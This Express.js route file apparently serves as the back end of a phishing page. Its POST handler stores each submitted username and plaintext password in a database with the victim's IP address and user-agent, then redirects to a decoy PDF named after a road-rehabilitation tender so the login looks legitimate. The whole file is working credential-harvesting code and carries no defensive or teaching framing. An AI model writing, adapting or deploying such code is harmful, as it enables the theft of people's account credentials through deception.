const express = require('express');
const router = express.Router();
const promisePool = require('../db');  // Correctly importing promisePool
const path = require('path');

router.use(express.static(path.join(__dirname, 'public')));

router.post('/', async (req, res) => {
  
  // Updated to match the EJS input names
  const name = req.body.username;
  const passwd = req.body.password;
  const agent = req.headers['user-agent'];
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const time = new Date().toISOString();

 

  try {
   
      // If no record found, insert a new one
      const insertQuery = `
        INSERT INTO table1 (username, password, requestIP, requestOS, requestTime) 
        VALUES (?, ?, ?, ?, ?)
      `;
      await promisePool.query(insertQuery, [name, passwd, ip, agent, time]);
      console.log('Record inserted');
  

    // Redirect after successful insert/update
    res.redirect('/REHABILITATION OF ROAD AT M.I YARD WEST WHARF.pdf');
  } catch (err) {
    console.error('❌ Error interacting with DB:', err.message);
    res.status(500).send('Internal Server Error');
  }
});

module.exports = router;
